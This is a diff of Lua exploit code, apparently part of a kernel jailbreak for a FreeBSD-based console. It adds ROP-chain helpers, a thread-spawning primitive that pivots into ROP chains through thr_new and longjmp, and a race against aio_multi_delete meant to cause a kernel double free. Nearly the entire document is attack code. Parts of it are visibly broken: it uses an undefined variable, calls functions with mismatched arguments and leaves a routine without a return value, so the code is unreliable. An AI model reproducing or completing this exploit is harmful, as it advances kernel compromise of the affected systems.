@@ -8,11 +8,17 @@ syscall.resolve({
     setsockopt = 0x69,
     listen = 0x6a,
     
+    getsockopt = 0x76,
     socketpair = 0x87,
+    thr_exit = 0x1af,
+    sched_yield = 0x14b,
+    thr_new = 0x1c7,
     cpuset_getaffinity = 0x1e7,
     cpuset_setaffinity = 0x1e8,
     rtprio_thread = 0x1d2,
     
+    thr_suspend_ucontext = 0x278,
+
     aio_multi_delete = 0x296,
     aio_multi_wait = 0x297,
     aio_multi_pool = 0x298,
@@ -97,8 +103,140 @@ function get_rtprio()
     return rtprio(RTP_LOOKUP)
 end
 
+-- rop functions
+
+function rop_get_current_core(chain, mask)
+    local level = 3
+    local which = 1
+    local id = -1
+    chain:push_syscall(syscall.cpuset_getaffinity, level, which, id, 0x10, mask)
+end
+
+function rop_pin_to_core(chain, core)
+    local level = 3
+    local which = 1
+    local id = -1
+    local setsize = 0x10
+    local mask = memory.alloc(0x10)
+    memory.write_word(mask, bit32.lshift(1, core))
+    chain:push_syscall(syscall.cpuset_setaffinity, level, which, id, setsize, mask)
+end
+
+function rop_set_rtprio(chain, prio)
+    local PRI_REALTIME = 2
+    local rtprio = memory.alloc(0x4)
+    memory.write_word(rtprio, PRI_REALTIME)
+    memory.write_word(rtprio + 0x2, prio)
+    chain:push_syscall(syscall.rtprio_thread, 1, 0, rtprio)
+end
+
+-- spin until comparison is false
+function rop_wait_for(chain, value_address, op, compare_value)
+    chain:gen_loop(value_address, op, compare_value, function()
+        chain:push_syscall(syscall.sched_yield)
+    end)
+end
 
 
+
+--
+-- primitive thread class
+--
+-- use thr_new to spawn new thread
+--
+-- only bare syscalls are supported. any attempt to call into few libc 
+-- fns (such as printf/puts) will result in a crash
+--
+
+prim_thread = {}
+prim_thread.__index = prim_thread
+
+function prim_thread.init()
+
+    local setjmp = fcall(libc_addrofs.setjmp)
+    local jmpbuf = memory.alloc(0x60)
+    
+    -- get existing regs state
+    setjmp(jmpbuf)
+
+    prim_thread.fpu_ctrl_value = memory.read_dword(jmpbuf + 0x40)
+    prim_thread.mxcsr_value = memory.read_dword(jmpbuf + 0x44)
+
+    prim_thread.initialized = true
+end
+
+function prim_thread:prepare_structure()
+
+    local jmpbuf = memory.alloc(0x60)
+
+    -- skeleton jmpbuf
+    memory.write_qword(jmpbuf, gadgets["ret"]) -- ret addr
+    memory.write_qword(jmpbuf + 0x10, self.chain.stack_base) -- rsp - pivot to ropchain
+    memory.write_dword(jmpbuf + 0x40, prim_thread.fpu_ctrl_value) -- fpu control word
+    memory.write_dword(jmpbuf + 0x44, prim_thread.mxcsr_value) -- mxcsr
+
+    -- prep structure for thr_new
+
+    local stack_size = 0x400
+    local tls_size = 0x40
+    
+    self.thr_new_args = memory.alloc(0x80)
+    self.tid_addr = memory.alloc(0x8)
+
+    local cpid = memory.alloc(0x8)
+    local stack = memory.alloc(stack_size)
+    local tls = memory.alloc(tls_size)
+
+    memory.write_qword(self.thr_new_args, libc_addrofs.longjmp) -- fn
+    memory.write_qword(self.thr_new_args + 0x8, jmpbuf) -- arg
+    memory.write_qword(self.thr_new_args + 0x10, stack)
+    memory.write_qword(self.thr_new_args + 0x18, stack_size)
+    memory.write_qword(self.thr_new_args + 0x20, tls)
+    memory.write_qword(self.thr_new_args + 0x28, tls_size)
+    memory.write_qword(self.thr_new_args + 0x30, self.tid_addr) -- child pid
+    memory.write_qword(self.thr_new_args + 0x38, cpid) -- parent tid
+
+    self.ready = true
+end
+
+
+function prim_thread:new(chain)
+
+    if not prim_thread.initialized then
+        prim_thread.init()
+    end
+
+    if not chain.stack_base then
+        error("`chain` argument must be a ropchain() object")
+    end
+
+    -- exit ropchain once finished
+    chain:push_syscall(syscall.thr_exit, 0)
+
+    local self = setmetatable({}, prim_thread)    
+    
+    self.chain = chain
+
+    return self
+end
+
+-- run ropchain in primitive thread
+function prim_thread:run()
+
+    if not self.ready then
+        self:prepare_structure()
+    end
+
+    -- spawn new thread
+    if syscall.thr_new(self.thr_new_args, 0x68):tonumber() == -1 then
+        error("thr_new() error: " .. get_error_string())
+    end
+
+    self.ready = false
+    self.tid = memory.read_qword(self.tid_addr):tonumber()
+    
+    return self.tid
+end
 
 
 
@@ -128,12 +266,17 @@ AIO_STATE_ABORTED = 4
 
 MAIN_CORE = 2
 MAIN_RTPRIO = 0x100
+AIO_MULTI_DELETE_CORE = 3
 
 NUM_WORKERS = 2
 NUM_GROOMS = 0x200
 NUM_HANDLES = 0x100
 NUM_RACES = 100
 NUM_SDS = 0x100
+
+IPPROTO_TCP = 6
+TCP_INFO = 0x20
+size_tcp_info = 0xec
 
 -- max number of requests that can be created/polled/canceled/deleted/waited
 MAX_AIO_IDS = 0x80
@@ -216,6 +359,13 @@ end
 
 function new_tcp_socket()
     return syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
+end
+
+function gsockopt(sd, level, optname, optval, optlen)
+    local size = memory.alloc(4 * optlen)
+
+    syscall.getsockopt(sd, level, optname, optval, size)
+    return memory.read_dword(size):tonumber()
 end
 
 function make_reqs1(num_reqs)
@@ -348,19 +498,86 @@ function setup(block_fd)
     return block_id, groom_ids
 end
 
+start_signal = memory.alloc(0x8)
+exit_signal = memory.alloc(0x8)
+resume_signal = memory.alloc(0x8)
+
+function reset_race_state()
+    
+    -- clean up race states
+    memory.write_qword(start_signal, 0)
+    memory.write_qword(exit_signal, 0)
+    memory.write_qword(resume_signal, 0)
+end
+
+function prepare_aio_multi_delete_rop(sce_errs)
+
+    local chain = ropchain()
+
+    rop_pin_to_core(chain, AIO_MULTI_DELETE_CORE)
+    rop_set_rtprio(chain, MAIN_RTPRIO)
+
+    -- wait until it receives signal to resume
+    rop_wait_for(chain, start_signal, "==", 0)
+
+    -- do aio delete operation
+    chain:push_syscall(syscall.aio_multi_delete, request_addr, 1, sce_errs+4)
+
+    -- wait until it receives signal to resume
+    rop_wait_for(chain, resume_signal, "==", 0)
+
+    return chain
+end
+
+function race_one(request_addr, tcp_sd, barrier, racer, sds)
+    reset_race_state()
+
+    local sce_errs = memory.alloc(8)
+    memory.write_dword(sce_errs, -1)
+    memory.write_dword(sce_errs+4, -1)
+    
+    local chain = prepare_aio_multi_delete_rop(sce_errs)
+    local thr = prim_thread:new(chain)
+    thr:prepare_structure()
+    local thr_tid = thr:run()
+
+    printf("Race one thread ID: %d", thr_tid)
+    memory.write_qword(start_signal, 1)
+
+    -- local suspend = syscall.thr_suspend_ucontext(thr_tid):tonumber()
+    -- printf("suspend %d: %d", thr_tid, suspend)
+
+    -- local error_func = fcall(libc_addrofs.error)
+    -- local errno = memory.read_qword(error_func()):tonumber()
+    -- printf("errno: %s", get_error_string())
+
+    local won_race = false
+
+    local poll_err = memory.alloc(4);
+    aio_multi_poll(request_addr, 1, poll_err)
+    local poll_res = memory.read_dword(poll_err):tonumber()
+    printf("poll: %x", poll_res)
+
+    local info_buf = memory.alloc(size_tcp_info)
+    local info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, size_tcp_info)
+    printf("info size: %x", info_size)
+
+    if info_size ~= size_tcp_info then
+        dbgf("info size isn't " .. size_tcp_info .. ": " .. info_size)
+    end
+end
 
 function double_free_reqs2(sds)
     local function htons(port)
         return bit32.bor(bit32.lshift(port, 8), bit32.rshift(port, 8)) % 0x10000
     end
 
-    -- local socket_path = "/mnt/sandbox/socket"
-    local socket_path = "/system_tmp/socket"
+    -- TODO: Find another path
+    local socket_path = "/mnt/sandbox/socket"
+    -- local socket_path = "/av_contents/content_tmp/socket"
     
     local server_addr = memory.alloc(128)
     local addrlen = memory.alloc(8)
-    
-    -- Set address family to AF_UNIX
     memory.write_byte(server_addr + 1, AF_UNIX)
     
     -- Write socket path to the structure
@@ -371,7 +588,6 @@ function double_free_reqs2(sds)
     
     local addr_size = 2 + #socket_path + 1  -- family byte + path + null terminator
     
-    -- const racer = new Chain();
     local barrier = memory.alloc(8)
     -- pthread_barrier_init(barrier, 0, 2)
 
@@ -379,6 +595,7 @@ function double_free_reqs2(sds)
     local which_req = num_reqs - 1
     local reqs1 = make_reqs1(num_reqs)
     local aio_ids = memory.alloc(4 * num_reqs)
+    local req_addr = aio_ids + (4 * which_req)
     local cmd = AIO_CMD_MULTI_READ
 
     syscall.unlink(socket_path)
@@ -396,10 +613,11 @@ function double_free_reqs2(sds)
         error("listen() error: " .. get_error_string())
     end
 
+    -- NUM_RACES = 1
     for i=1,NUM_RACES do
-        -- print()
-        -- printf("== attempt #%d ==", i)
-        -- print()
+        print()
+        printf("== attempt #%d ==", i)
+        print()
 
         local client_fd = syscall.socket(AF_UNIX, SOCK_STREAM, 0):tonumber()
         if client_fd < 0 then
@@ -431,8 +649,7 @@ function double_free_reqs2(sds)
 
         -- drop the reference so that aio_multi_delete() will trigger _fdrop()
         syscall.close(client_fd)
-        -- const res = race_one(req_addr, sd_conn, barrier, racer, sds);
-        -- racer.reset();
+        local res = race_one(req_addr, conn_fd, barrier, sds)
 
         -- MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
         -- twice. this will leave one request undeleted
@@ -443,7 +660,7 @@ function double_free_reqs2(sds)
             printf('won race at attempt: %d', i)
             syscall.close(server_fd)
             syscall.unlink(server_fd)
-            pthread_barrier_destroy(barrier)
+            -- pthread_barrier_destroy(barrier)
             return res
         end
     end
